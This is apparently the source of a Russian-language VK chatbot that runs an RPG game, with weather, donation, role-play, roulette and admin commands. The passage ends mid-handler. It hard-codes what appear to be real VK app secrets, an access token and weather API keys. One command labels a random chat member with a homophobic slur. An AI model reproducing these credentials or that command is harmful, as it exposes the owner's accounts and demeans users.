const { VK, Keyboard } = require('vk-io');
const vk = new VK({
	appId: 7473811,
	appSecret: "VXsfCCEtcR0wQL3w2Y92",
	token: "3a8bcc92f3f741592310d92ab5ed7e3d365f128733ef90c289525be20ad4da918d4e675043eb0e4fc92e2",
	apiMode: "parallel",
	pollingGroupId: 184999488
});
const {updates, api, snippets, upload} = vk;
const fs = require("fs");
const request = require('prequest');
const requestp = require('request-promise');
const world = require("./base/world.json");
const rpg = require("./base/rpg_acc.json");
const rpcode = require("./base/rpromos.json");
const weapons = require("./base/weapons.json");
const sets = require("./base/sets.json");
const mobs = require("./base/mobs.json");
const uid = require("./base/uid.json");
const express = require('express');
const app = express();

app.get('/', (req, res) => {
res.json ("./wild");
});
app.get("/", (request, response) => {
response.sendStatus(200);
});
app.listen(process.env.PORT)

setInterval(function(){
	fs.writeFileSync("./base/world.json", JSON.stringify(world, null, "\t"))
	fs.writeFileSync("./base/rpg_acc.json", JSON.stringify(rpg, null, "\t"))
	fs.writeFileSync("./base/uid.json", JSON.stringify(uid, null, "\t"))
  fs.writeFileSync("./base/rpromos.json", JSON.stringify(rpcode, null, "\t"))
	fs.writeFileSync("./base/weapons.json", JSON.stringify(weapons, null, "\t"))
	fs.writeFileSync("./base/sets.json", JSON.stringify(sets, null, "\t"))
	fs.writeFileSync("./base/mobs.json", JSON.stringify(mobs, null, "\t"))
}, 5000);

//------------------------------------------------------------------------------------\\

 	var uptime = { sec: 0, min: 0, hours: 0, days: 0 }

 //------------------------------------------------------------------------------------\\

	setInterval(() => {
		uptime.sec++;
		if (uptime.sec == 60) { uptime.sec = 0; uptime.min += 1; }
		if (uptime.min == 60) { uptime.min = 0; uptime.hours += 1; }
		if (uptime.hours == 24) { uptime.hours = 0; uptime.days += 1; }
	}, 1000);

 	 function time() {
			let date = new Date();
			let days = date.getDate();
			let hours = date.getHours();
			let minutes = date.getMinutes();
			let seconds = date.getSeconds();
			if (hours < 10) hours = "0" + hours;
			if (minutes < 10) minutes = "0" + minutes;
			if (seconds < 10) seconds = "0" + seconds;
			var times = hours + ':' + minutes
			return times;
	}
 //------------------------------------------------------------------------------------
	 function data() {
		var date = new Date();
		let days = date.getDate();
		let month = date.getMonth() + 1;
		if (month < 10) month = "0" + month;
		if (days < 10) days = "0" + days;
		var datas = days + '.' + month + '.2019' ;
		return datas;
	}

 	function user_id(id) {
	 	let ids = 0
	 	if(uid[id]){
	 		ids = uid[id].id
	 	}
		return ids;
	}

vk.updates.use(async (context, next) => {
    context.user = context.senderId;
		if(context.isGroup == true) return;
		if(context.isOutbox) return;
	if(context.hasGeo == true){
		let msg = context.id;
		let geo = context.geo;
		var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
		var data = null;

var xhr = new XMLHttpRequest();
xhr.withCredentials = true;

xhr.addEventListener("readystatechange", function () {
	if (this.readyState === this.DONE) {
		var w = JSON.parse(this.responseText)
		let weather = w.data[0]
		return context.send(`
🌐 Погода в ${geo.place.title}
✨ ${weather.temp}°C / ${weather.weather.description}

☁ Облака: ${weather.clouds}%

💨 Ветер: ${weather.wind_cdir_full}
🌪 Скорость ветра: ${Math.floor(weather.wind_spd)} м/c
`)
	}
});

xhr.open("GET", "https://weatherbit-v1-mashape.p.rapidapi.com/current?lang=ru&lon=" + geo.coordinates.longitude + "&lat=" + geo.coordinates.latitude);
xhr.setRequestHeader("x-rapidapi-host", "weatherbit-v1-mashape.p.rapidapi.com");
xhr.setRequestHeader("x-rapidapi-key", "fc03049cd0msh2cd2673600da788p18b331jsn31137ba3c1ac");

xhr.send(data);

	}
		if(!context.text) return;

    if(!uid[context.user]){
	 	rpg.number += 1;
		let numm = rpg.number;
		uid[context.user] = {
			id: numm
		}
    if(context.is("context") && context.isOutbox)
        return;

 		let id = user_id(context.user);


		rpg.users[numm] = {
		chat: false,
		ban: false,
		gold: 0,
		diamond: 0,
		card: 0,
		lvl: 1,
		level: 0,
        rang: 1,
		points: 1,
		exp: 0,
		prefix: `Пользователь`,
		id: context.user,
		aid: numm,
		heroid: false,
		class: `Человек`,
		hp: 20,
		defence: 1,
		damage: 1,
		limits: {
			bonus: 'first',
			war: false,
			travel: false,
			pvewar: false,
            build: false,
            id: false,
            up: false
		},
		skill: {},
		weapon: {},
		objects: {
            lesopilka: 0,
            kamenolom: 0,
            gold: 0,
            hp: false,
            def: false,
            dmg: false,
            skill: false
				},
		clan: false,
		registered: false,
		inventory: {},
		inv_slots: 10,
		inv_empty: 1,
		items: 0,
		res: {
				stone: 0,
				wood: 0
		},
		reskey: 0,
		itemkey: 0,
		weaponwear : false,
		setwear: false,
		temp: {
			hp: 0,
			damage: 0
		},
		enemyid: false,
		enemy: {},
		kills: {
			pve: {
				total: 0,
				today: 0
			},
			pvp: {
				total: 0,
				today: 0
			}
		},
		die: {
			pve: 0,
			pvp: 0
		},
		kbd: false,
		rolls: 0,
		set: {}
	};

		////////////////////
			vk.api.call('users.get', {
				user_ids: context.user,
				fields: "photo_max,city,verified,status,domain,photo_id,sex,last_seen,screen_name"
			}).then(res => {
				let user = res[0];
				rpg.users[user_id(context.user)].prefix = `${user.first_name}`;
				rpg.users[user_id(context.user)].usid = `${user.screen_name}`;
                rpg.users[user_id(context.user)].sex = `${user.sex}`;
			}).catch((error) => {console.log('err[prefix]'); });

				let user = rpg.users[user_id(context.user)];
				api.messages.send({
					user_id: 270911031,
					message: `🔔 ➾ [Регистрация]\n🆕 ➾ @id${context.user} (Новый игрок)\n✅ ➾ ID: ${numm}`
				}).then((res) => {}).catch((error) => {console.log('ошибка передачи данных о новом пользователе'); });
	}

	let id = user_id(context.user);

	if(context.text){
		if(!rpg.users[id]) return;
		if(rpg.users[id].id == "270911031") rpg.users[id].level = 2;
        if(rpg.users[id]){
			rpg.users[id].chat = context.chatId
			rpg.users[id].id = context.user
        }
}

	if(rpg.users[id]){
	if(rpg.users[id].ban != false){
    if(context.isChat == false){
    return context.send(`🔒 ➾ Вы заблокированы!\n🔒 ➾ Оставшееся время блокировки: ${rpg.users[id].bantime} минут(ы)`);
    }
    if(context.isChat == true) return;
  }
	}
    try {
        await next();
    } catch (err) { console.error(err) }
});



//Откаты//
 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.ban != false){
                 user.bantime -= 1
                 if(user.bantime <= 0){
                     user.ban = false
                           api.messages.send({
                            peer_id: user.id,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ Ваш аккаунт успешно разблокирован! Впредь, не нарушайте правила!`
                    });
                 }
 			 }
 		}
 	}, 60000);

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.mute == true){
                 user.mutetime -= 1
                 if(user.mutetime <= 0){
                     user.mute = false
                           api.messages.send({
                            peer_id: user.id,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ доступ к репорту успешно разблокирован! Впредь, не нарушайте правила!`
                    });
                 }
 			 }
 		}
 	}, 60000);

 	/*setInterval(() =>{
 		for(i in rpg.users){
			if(rpg.users[i]){
			if(rpg.users[i].pet[i]){
			rpg.users[i].pet[i].fun -= 10;
				if(rpg.users[i].pet[i].fun == -10){
					rpg.users[i].pet[i].fun += 10;
					rpg.users[i].pet[i].exp -= 1;
				}
			rpg.users[i].pet[i].exp += 1;
				if(rpg.users[i].pet[i].exp == rpg.users[i].pet[i].expup){
					rpg.users[i].pet[i].exp = 0;
					rpg.users[i].pet[i].lvl += 1;
					rpg.users[i].pet[i].expup = rpg.users[i].pet[i].lvl * 5
				}
			rpg.users[i].pet[i].hunger += 10;
				if(rpg.users[i].pet[i].hunger == 110){
					rpg.users[i].pet[i].hunger -= 10;
					rpg.users[i].pet[i].hp -= 10;
						if(rpg.users[i].pet[i].hp == 0){
							api.messages.send({
							peer_id: rpg.users[i].id,
							message: `&#4448;&#4448;&#4448;💀RIP💀\n&#4448;&#4448;&#4448;${rpg.users[i].pet[i].name}, ${rpg.users[i].pet[i].type}\n${rpg.users[i].pet[i].bdate} - ${data()}`
							});
							delete rpg.users[i].pet[i];
						}
				}
 			}
            }
 		}
 	}, 3600000); */

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.bonus == true){
                 user.bonustime -= 1
                    if(user.bonustime == 0){
                    user.limits.bonus = false;
                 }
 			 }
 		}
 	}, 60000);

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
			if(user.safe){
 			 if(user.safe.status == true){
                 user.safetime -= 1
                    if(user.safetime == 0){
                    user.safe.status = false;
                 }
 			 }
 		}
		}
 	}, 60000);

	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.daily == true){
                 user.dailytime -= 1
                    if(user.dailytime <= 0){
                    user.limits.daily = false;
					user.dailyskip = 1440;
                 }
 			 }
 		}
 	}, 3600000);

	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.daily == false){
                 user.dailyskip -= 1
                    if(user.dailyskip <= 0){
                    user.bonuslvl = 0;
                 }
 			 }
 		}
 	}, 60000);

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.travel == true){
                 user.traveltime -= 1
                    if(user.traveltime == 0){
                    user.limits.travel = false;
 				    let t = rand(20,60);
				    let k = rand(10,40);
                    let z = rand(10,20);
                    if(rand(1, 10) == 3){
                        item_drop(user)
						}
					uplvl(user)
				    user.res.wood += Number(t);
				    user.res.stone += Number(k);
				    user.gold += Number(z)
                        if(user.chat == null){
                           api.messages.send({
                            peer_id: user.id,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ Ваш герой вернулся с экспедиции и принес:\n${t} дерева, ${k} камня, ${z} золота.`
                    });
                        }
                        if(user.chat != null){
                        api.messages.send({
                            peer_id: 2000000000 + user.chat,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ Ваш герой вернулся с экспедиции и принес:\n${t} дерева, ${k} камня, ${z} золота.`
                    });
                        }
                 }
 			 }
 		}
 	}, 60000);

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.pvewar == true){
                 user.pvetime -= 1
                    if(user.pvetime == 0 || user.pvetime < 0){
                    user.limits.pvewar = false;
                 }
 			 }
 		}
 	}, 60000);

 	setInterval(() =>{
 		for(i in rpg.users){
            let user = rpg.users[i];
 			 if(user.limits.skill == true){
                 user.skill.time -= 1
                    if(user.skill.time == 0){
                    user.limits.skill = false;
                        if(user.chat == null){
                           api.messages.send({
                            peer_id: user.id,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ Навык успешно восстановлен!`
                    });
                        }
                        if(user.chat != null){
                        api.messages.send({
                            peer_id: 2000000000 + user.chat,
                            message: `⏩ @id${user.id}(${user.prefix})\n⏩ Навык успешно восстановлен!`
                    });
                        }
                 }
 			 }
 		}
 	}, 60000);

//Откаты// https://api.warframestat.us/drops/search/{query}
	vk.updates.hear(/^(?:.цетус|.вф)/i,  (context) => {
	var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
	var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://api.warframestat.us/pc/cetusCycle", false );
	xmlHttp.setRequestHeader('Accept-Language', 'ru');
    xmlHttp.send( null );
	var w = JSON.parse(xmlHttp.responseText)
		if(w.state == "night"){
			return context.send(`Сейчас на Цетусе ночь\n${w.timeLeft} осталось`);
		}
		if(w.state == "day"){
			return context.send(`Сейчас на Цетусе день\n${w.timeLeft} осталось`);
		}
 	});

 	vk.updates.hear(/^(?:тайм)/i,  (context) => {
		let hour = new Date().getHours() + 3
		let minute = new Date().getMinutes()
		let time = `${nols(hour)}:${nols(minute)}`
 		return context.send(`&#10004; » Работаю!\n⏰ » Дней: ${uptime.days}\n⏰ » Часов: ${uptime.hours}\n⏰ » Минут: ${uptime.min}\n⏰ » Секунд: ${uptime.sec}\n\n ${time}`);
 	});

 	vk.updates.hear(/^(?:погода)/i,  (context) => {
 		return context.send({
		message: `Нажмите, чтобы получить данные о погоде:`,
		keyboard: Keyboard.keyboard([
							[
									Keyboard.locationRequestButton({
									})
							],
							])
							.inline(true)
		});
 	});

 	 vk.updates.hear(/^(?:правила)/i, (context) => {
 		 return context.send(`
		🔥Актуальный список правил бота Wild🔥

⚠» ЗАПРЕЩЕНО:
🔹» 1.1. Оскорбление любого пользователя.
🚫» Наказание: Блокировка аккаунта.
🔹» 1.2. Обман администрации любым способом.
🚫» Наказание: Блокировка аккаунта.
🔹» 1.3. Выпрашивание валюту/донат.
🚫» Наказание: Временная блокировка.
🔹» 1.4. Бессмысленные сообщения в "репорт".
🚫» Наказание: Временная блокировка.
🔹» 1.5. Использование багов, лазеек с целью собственной выгоды.
🚫» Наказание: Временная блокировка аккаунта.
🔹» 1.6. Выдавать себя за Wild Creatorа/администратора.
🚫» Наказание: Блокировка аккаунта.
🔹» 1.7. Продажа игровой валюты.
🚫» Наказание: Блокировка.
🔹» 1.8. Реклама/пиар/выпрашивание лайков.
🚫» Наказание: Первый раз - кик из беседы, последующие разы - блокировка.
🔹» 1.9. Регистрация твинков (вторых аккаунтов).
🚫» Наказание: Блокировка.
🔹» Администрация в праве не разглашать причину блокировки.

⛔» Незнание правил не освобождает от ответственности.

 		 	`);
 	});

	vk.updates.hear(/^(?:помощь|начать)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	if(!user) return context.send(`⚠ Произошла ошибка ! Пожалуйста, сообщите в репорт.`);
	if(context.isChat != true){
	return context.send({
		message:`
	@id${context.user} (${user.prefix}),
	🧙 ⇨ Magic RPG ⇦ 🎮
▶ ➾ Для начала создай персонажа «!создать».
✔ ➾ Получи начальный бонус «!бонус» и возвращайся за ним еще раз через время!
➕ ➾ Вкачай персонажа «!вознесение».
⚔ ➾ Сражайся с монстрами «!пве».

✅ ➾ Полный список команд ты можешь получить введя «!команды».


🍀 ➾ Удачи!.

Платформа: @wild_play (Wild)`,
	keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({
            label: '👥 Профиль',
            color: Keyboard.POSITIVE_COLOR,
            })
	],
	[
            Keyboard.textButton({
            label: '⚔ PVE',
            color: Keyboard.POSITIVE_COLOR,
            })
	]
	])
	.oneTime()
	})
	}
	if(context.isChat == true){
	return context.send({
		message:`
	@id${context.user} (${user.prefix}),
	🧙 ⇨ Magic RPG ⇦ 🎮
▶ ➾ Для начала создай персонажа командой «!создать».
✔ ➾ Получи начальный бонус командой «!бонус» и возвращайся за ним еще раз через время!
➕ ➾ Вкачай персонажа свитками командой «!свитки все».
⚔ ➾ Сражайся с монстрами командой «!пве».

✅ ➾ Полный список команд ты можешь получить введя «команды».


🍀 ➾ Удачи!.

Платформа: @wild_play (Wild)`,
	})
	}
   });

   	vk.updates.hear(/^(?:клава)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let platform = false
	if(context.isChat) platform = true
	return context.send({
		message: `@id${user.id} (${user.prefix}), подтвердите запрос:`,
		keyboard: Keyboard.keyboard([
     [
            Keyboard.textButton({
            label: '⛔️ Убрать клавиатуру',
			color: Keyboard.NEGATIVE_COLOR
            })
	]
	])
	.oneTime(true)
	})
});

   	vk.updates.hear(/^(?:⛔️ Убрать клавиатуру)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	return context.send(`@id${user.id} (${user.prefix}), клавиатура успешно убрана!`)
});

   	vk.updates.hear(/^(?:донат)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	return context.send({
		message: `@id${user.id} (${user.prefix}), лот подготовлен:`,
		attachment: "doc270911031_538723366",
		keyboard: Keyboard.keyboard([
     [
			Keyboard.payButton({
				hash: {
					action: 'pay-to-user',
					user_id: 270911031,
					amount: 10,
					description: `Пак: 10 ОВ | VKID: ${user.usid} | GID: ${user_id(context.user)}`
				}
			})
	]
	])
	.inline(true)
	})
});

   	vk.updates.hear(/^(?:запрос)\s?([0-9]+)?\s([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1]
	let x = context.$match[2]
	return context.send({
		message: `@id${user.id} (${user.prefix}), лот подготовлен:`,
		attachment: "doc270911031_538723366",
		keyboard: Keyboard.keyboard([
     [
			Keyboard.payButton({
				hash: {
					action: 'pay-to-user',
					user_id: 270911031,
					amount: i,
					description: `${x}`
				}
			})
	]
	])
	.inline(true)
	})
});

   	vk.updates.hear(/^(?:погода)\s?([0-9]+)?\s([^]+)?/i,  (context) => {
	if(context.hasGeo == true){
		let msg = context.id;
		let geo = context.geo;
		var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
		var xmlHttp = new XMLHttpRequest();

    xmlHttp.open( "GET", "https://api.gismeteo.net/v2/weather/current/?latitude=" + geo.coordinates.latitude + "&longitude=" + geo.coordinates.longitude, false );
	xmlHttp.setRequestHeader('X-Gismeteo-Token', '56b30cb255.3443075');
	xmlHttp.setRequestHeader('Accept-Encoding', 'deflate, gzip');
    xmlHttp.send( null );
	fs.writeFileSync("./base/fcast.json", JSON.stringify(w, null, "\t"))
		return context.send(`
		Погода в ${geo.place.title}

		Подробно: ${w.info.url}

		Температура: ${w.fact.temp}°C
		Ощущается: ${w.fact.feels_like}°C
		Описание: ${cond}
		Скорость ветра: ${w.fact.wind_speed} м/c

		Прогноз на ${w.forecasts[0].date}

		Средняя температура за день: ${w.forecasts[0].parts.day.temp_avg}°C

		Неделя: ${w.forecasts[0].week} (${week})

		`)

	}
});

   	vk.updates.hear(/^(?:время)$/i,  (context) => {
	context.send(time())
});

	vk.updates.hear(/^(?:участвую)$/i,  (context) => {
	if(!rpg.users[user_id(context.user)]) return context.send(`🚶 ➾ Вы не зарегистрированы! Введите "помощь"`);
	if(context.$from.type != 'user') return context.send(`Стать участником розыгрыша можно только в ЛС ${config.group_url}`);
	let user = rpg.users[user_id(context.user)];
	if(user.rozig == true) return context.send(`@id${context.user} (${user.prefix}), Вы уже участник розыгрыша!`)
	user.rozig = true
	return context.send(`@id${context.user} (${user.prefix}), вы успешно зарегистрированы в розыгрыше!`)
   });

	vk.updates.hear(/^(?:победитель)$/i,  (context) => {
	if(rpg.users[user_id(context.user)].level < 3) return context.send(`🚶 ➾ Нет доступа!`);
	let user = rpg.users[user_id(context.user)];
		let x = rand(2,rpg.number)
		if(rpg.users[x].rozig == true){
		vk.api.call("contexts.send", {
		peer_id: rpg.users[x].id,
		message: `Рандом попал на Вас! Администратор уже проводит последнюю проверку Вашего аккаунта на выполнение условий.`
		}).then((res) => {}).catch((error) => {console.log('context to user error'); });
			return context.send(`@id${rpg.users[x].id} (${rpg.users[x].prefix}) - вероятный победитель розыгрыша!`)
		}
		return context.send(`@id${rpg.users[x].id} (${rpg.users[x].prefix}) мог бы быть победителем, но он не выполнил одно из условий розыгрыша!`)
   });

/////RP/////
vk.updates.hear(/^(?:рплист)$/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	return context.send(`@id${context.user} (${user.prefix}),
Список простых RP команд:
1. обнять <цель>
2. ударить <цель>
3. выпить
`)
   });

vk.updates.hear(/^(?:обнять)\s?([^]+)?/i,  (context) => {
	let us = rpg.users[user_id(context.user)];
	let i = context.$match[1]
    let pic = ['photo-184999488_457239498', 'photo-184999488_457239499', 'photo-184999488_457239500', 'photo-184999488_457239501', 'photo-184999488_457239502'].random()
	if(!i) return context.send(`Укажите цель.`);
        vk.api.call('users.get', {
				user_ids: context.user,
				fields: "sex,first_name"
			}).then(res => {
				let user = res[0];
            us.sex = user.sex
            us.realname = user.first_name
    if(us.sex == 1){
	return context.send(`
    🤗 @id${us.id} (${us.realname}) обняла ${i} 💞`, {attachment: pic})
    }
    if(us.sex == 2){
	return context.send(`
    🤗 @id${us.id} (${us.realname}) обнял ${i} 💞`, {attachment: pic})
    }
})
   });

vk.updates.hear(/^(?:ударить|уебать|въебать)\s?([^]+)?/i,  (context) => {
	let us = rpg.users[user_id(context.user)];
	let i = context.$match[1]
    let pic = ['photo-184999488_457239512', 'photo-184999488_457239513', 'photo-184999488_457239514'].random()
	if(!i) return context.send(`Укажите цель.`);
        vk.api.call('users.get', {
				user_ids: context.user,
				fields: "sex,first_name"
			}).then(res => {
				let user = res[0];
            us.sex = user.sex
            us.realname = user.first_name
    if(us.sex == "1"){
	return context.send(`
    🤜 @id${us.id} (${us.realname}) уебала ${i} 💥`, {attachment: pic})
    }
    if(us.sex == "2"){
	return context.send(`
    🤜 @id${us.id} (${us.realname}) уебал ${i} 💥`, {attachment: pic})
    }
        })
   });

vk.updates.hear(/^(?:!выпить)\s?([^]+)?/i,  (context) => {
	let user = rpg.users[user_id(context.user)];
	let i = context.$match[1]
    let pic = ['photo-184999488_457239515', 'photo-184999488_457239516', 'photo-184999488_457239517', 'photo-184999488_457239518', 'photo-184999488_457239519', 'photo-184999488_457239520'].random()
    if(!i) return context.send(`1. Вода | 0 💰\n2. Сок | 10 💰\n3. Кола | 50 💰\n4. Кофе | 100 💰\n5. Энергетик | 150 💰\n6. Пиво | 200 💰\n7. Эль | 500 💰\n8. Виски | 1.000 💰\n9. Вино | 5.000 💰\n10. Коньяк | 10.000 💰`);
    let price = 0
    if(i == 1){
        i = "Воды"
    }
    if(i == 2){
        i = "Сок"
        price = 10
    }
    if(i == 3){
        i = "Колы"
        price = 50
    }
    if(i == 4){
        i = "Кофе"
        price = 100
    }
    if(i == 5){
        i = "Энергетик"
        price = 150
    }
    if(i == 6){
        i = "Пиво"
        price = 200
    }
    if(i == 7){
        i = "Эль"
        price = 500
    }
    if(i == 8){
        i = "Виски"
        price = 1000
    }
    if(i == 9){
        i = "Вино"
        price = 5000
    }
    if(i == 10){
        i = "Коньяк"
        price = 10000
    }
    if(user.gold < price) return context.send(`Отказано в покупке!\nНедостаточно средств.`)
    user.gold -= Number(price)
        vk.api.call('users.get', {
				user_ids: user.id,
				fields: "sex,first_name"
			}).then(res => {
				let user = res[0];
            user.sex = user.sex
            user.realname = user.first_name
    if(user.sex == 1){
	return context.send(`
    🍸 @id${user.id} (${user.realname}) выпила ${i}, стоимостью ${spaces(price)} 💰 🍷`, {attachment: pic})
    }
    if(user.sex == 2){
	return context.send(`
    🍸 @id${user.id} (${user.realname}) выпил ${i}, стоимостью ${spaces(price)} 💰 🍷`, {attachment: pic})
    }
        })
   });

vk.updates.hear(/^(?:сенпай|senpai|sempai)$/i,  (context) => {
	return context.send(`@id141862837 (Вызываю сенпая!) `)
   });

	vk.updates.hear(/^(?:кто пидор)$/i,  async (context) => {
		let us = rpg.users[user_id(context.user)];
		let usr = await api.messages.getConversationMembers({peer_id: 2000000000 + context.chatId, fields: "first_name"})
		let u = rand(0, usr.count-1)
		return context.send(`Я думаю, что пидор это @id${usr.items[u].member_id} (Этот человек!)`)
	});

	vk.updates.hear(/^(?:!cid)$/i,  async (context) => {
		let chat = context.chatId
		return context.send(`ChatID: ${chat}\n PeerID: ${context.peerId}`)
	});

vk.updates.hear(/^(?:!беседы)\s?([0-9]+)?/i,  async (context) => {
			let chats = await vk.api.messages.getConversations({});
			for(i in chats.items){
			/*let chat = await vk.api.messages.getConversationsById({peer_ids: 2000000000 + 21});
			console.log(`[${i}] ${chat}`)*/
			if(chats.items[i]){
				console.log(`[${i}] ${chats}`)
			}
			}
	});

vk.updates.hear(/^(?:!беседа)\s?([0-9]+)?/i,  async (context) => {
		if (!context.isChat) return context.send(`⚠️ Эта команда работает только в беседах!`)
		let game = rpg.users
		let text = ``
		try{
		let chat = await vk.api.messages.getConversationsById({peer_ids: context.peerId});
		text = `🌐 Информация об беседе "${chat.items[0].chat_settings.title}":`
		text += `
		@id${chat.items[0].chat_settings.owner_id} (Создатель беседы)
		ChatID: ${chat.items[0].peer.local_id}
		Всего участников: ${chat.items[0].chat_settings.members_count}
		Настройки:
		${(chat.items[0].chat_settings.acl.can_change_info == true ? `✅` : `🚫`)} Редактирование информации беседы
		${(chat.items[0].chat_settings.acl.can_invite == true ? `✅` : `🚫`)} Приглашения
		${(chat.items[0].chat_settings.acl.can_change_pin == true ? `✅` : `🚫`)} Смена закреплённого сообщения
		`
		}catch (error){return context.send(`⚠️ Ошибка! Вероятно, отсутствуют права администратора!`)}
		text += `👥 Участники:\n`
		try{
		let users = await vk.api.messages.getConversationMembers({peer_id: context.peerId});
		let self = users.items.find((item) => item.member_id === context.senderId);
		x = 0
		for(i in users.profiles){
			x++
			let user = users.items.find((item) => item.member_id === users.profiles[i].id)
			text += `				${(user.is_admin ? `⭐` : `👤`)} ${(game[user_id(user.member_id)] ? `✅` : `🚫`)} ${users.profiles[i].first_name} ${users.profiles[i].last_name}\n`
			if(x == users.count-1) break;
		}
			}catch (error){
		return context.send(`⚠️ Ошибка! Вероятно, отсутствуют права администратора!`)
			}
		return context.send(text)
	});

	vk.updates.hear(/^(?:ранд)$/i,  async (context) => {
		let user = rpg.users[user_id(context.user)];
		if(!user.rolls) user.rolls = 0
		if(user.rolls <= 0) return context.send(`У вас не осталось вращений!`)
			user.rolls -= 1;
		let win = ["💎", "💰", "💰", "🔑", "🔑", "🔑", "🔑", "🔑", "🗿", "🗿", "🗿", "🗿", "🗿", "🗿", "🌲", "🌲", "🌲", "🌲", "🌲", "🗿", "🗿", "🗿", "🗿", "🗿", "🗿", "🌲", "🌲", "🌲", "🌲", "🌲"];
		let time = 0;
		let times = rand(3, 10);
		let m = await api.messages.send({peer_id: context.peerId, message: `Крутим-вертим!`})
		await sleep(500)
		while (time < times){
			let i = rand(0, 29)
		api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\n${win[i]}`})
			if(i == 30) i = rand(0,29)
			time++
		await sleep(500)
		if(time >= times) {
			api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\nВы выиграли: ${win[i]}`});
			if(win[i] == "💎") user.diamond += 1
			if(win[i] == "💰"){
				let golds = [500, 1000, 2000, 5000, 500, 1000, 2000, 500, 500, 500, 1000, 5000, 500, 1000, 100, 1000, 1000, 500, 500, 10000, 500, 100, 500, 100, 500, 500, 100].random()
				user.gold += golds
				api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\nВы выиграли +${golds} ${win[i]}`});
			}
			if(win[i] == "🔑"){
				let keys = [1,1,1,1,1,1,1,1,1,5,5,5,5,5,10,10,10,15,15,30].random()
				user.reskey += keys
				user.itemkeys += keys
				api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\nВы выиграли +${keys} ${win[i]} от ящиков для ресурсов и предметов.`});
			}
			if(win[i] == "🗿"){
				let val = [500, 100, 200, 5000, 500, 1000, 200, 500, 500, 500, 100, 500, 500, 100, 100, 100, 100, 500, 500].random()
				user.res.stone += val
				api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\nВы выиграли +${val} ${win[i]}`});
			}
			if(win[i] == "🌲"){
				let val = [500, 100, 200, 5000, 500, 1000, 200, 500, 500, 500, 100, 500, 500, 100, 100, 100, 100, 500, 500].random()
				user.res.wood += val
				api.messages.edit({peer_id: context.peerId, message_id: m, message: `Крутим-вертим!\nВы выиграли +${val} ${win[i]}`});
			}
		}
		}
	});

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
/////RP/////

vk.updates.hear(/(get)$/i,async (context) => {
let platform = false
if(context.isChat) platform = true
let user = rpg.users[user_id(context.user)];
if(!context.forwards[0] && !context.hasReplyMessage) return context.send(`Пересланное сообщение не найдено.`)
if(context.forwards[0]) {
	let id = user_id(context.forwards[0].senderId);
    if(!rpg.users[id]) context.send("Данный пользователь не зарегистрирован!")
    return context.send(`VK ID: *id${context.forwards[0].senderId} (${context.forwards[0].senderId}) | GAME ID: *id${context.forwards[0].senderId} (${ids})`);
}
if(context.hasReplyMessage) {
	let ids = user_id(context.replyMessage.senderId);
    let ASS1 = context.replyMessage.senderId
    if(ASS1 == -184999488) return context.send(`Refused`)
    if(!rpg.users[ids]) context.send("Данный пользователь не зарегистрирован!")
    return context.send(`VK ID: *id${context.replyMessage.senderId} (${context.replyMessage.senderId}) | GAME ID: *id${context.replyMessage.senderId} (${ids})`);
}
});

  vk.updates.hear(/^(?:!рассылка)\s?([^]+)?/i,  context => {
	if(rpg.users[user_id(context.user)].level < 3) return;
	for(i in rpg.users){
		api.messages.send({
			user_id: rpg.users[i].id,
			message: `${context.$match[1]}`
		});
	}
	return context.send(`Сообщения отправлены!`);
});

	vk.updates.hear(/^(?:репорт|report|жалоба)\s?([^]+)?/i, (context) => {
 		if(context.$from.type != 'user') return context.send(`Обращаться в репорт можно только в ЛС ${config.group_url}`);
		let user = rpg.users[user_id(context.user)];
		if(!context.$match[1]) return context.send(`🔸 ➾ вы не написали жалобу | репорт [текст]`);
        if(user.mute == true) return context.send(`🔸 ➾ У Вас блокировка репорта!\n🔸 ➾ Оставшееся время: ${user.mutetime} минут`)
			if(user.blocks.repblock == true) return context.send(`🔸 ➾ Писать жалобу можно раз в минуту!`)
		setTimeout(() => {
			user.blocks.repblock = false
		}, 60000);
		user.blocks.repblock = true
        user.report = true
		for(i=0;i<200000;i++){
			if(rpg.users[i]){
			if(rpg.users[i].level >= 2){
				vk.api.call("contexts.send", {
					peer_id: rpg.users[i].id,
					message: `👉 ➾ [REPORT]\n👉 ➾ ID игрока: ${user_id(context.user)}\n👉 ➾ Жалоба: ${context.$match[1]}\n👉 ➾ [Для ответа: ответ [ID] [TEXT]]`
				}).then((res) => {}).catch((error) => {console.log('report error'); });
			}
		}
		}
		return context.send(`⚙ ➾ Вы успешно отправили жалобу.`);
	});

	vk.updates.hear(/^(?:ответ)\s?([0-9]+)?\s([^]+)?/i, (context) => {
		let user = rpg.users[user_id(context.user)];
